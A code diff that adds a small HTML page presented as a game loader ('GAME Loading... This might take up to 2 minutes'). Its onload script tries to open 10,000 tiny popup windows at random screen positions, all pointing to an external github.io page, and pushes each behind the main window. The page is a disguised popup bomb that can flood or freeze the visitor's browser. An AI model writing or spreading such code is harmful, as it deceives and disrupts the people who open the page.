@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⸻GAME-STARTING⸻</title>
+    <script>
+        window.onload = function() {
+            for (let i = 0; i < 10000; i++) {
+                const width = 50;
+                const height = 50;
+                const x = Math.random() * (window.screen.width - width);
+                const y = Math.random() * (window.screen.height - height);
+                const newWindow = window.open("https://button360.github.io/360", "_blank", `width=${width},height=${height},top=${y},left=${x}`);
+                if (newWindow) {
+                    newWindow.blur();
+                    window.focus();
+                }
+            }
+        };
+    </script>
+</head>
+<body>
+    <h1>GAME Loading...</h1>
+    <p>This might take up to 2 minutes.</p>
+</body>
+</html>
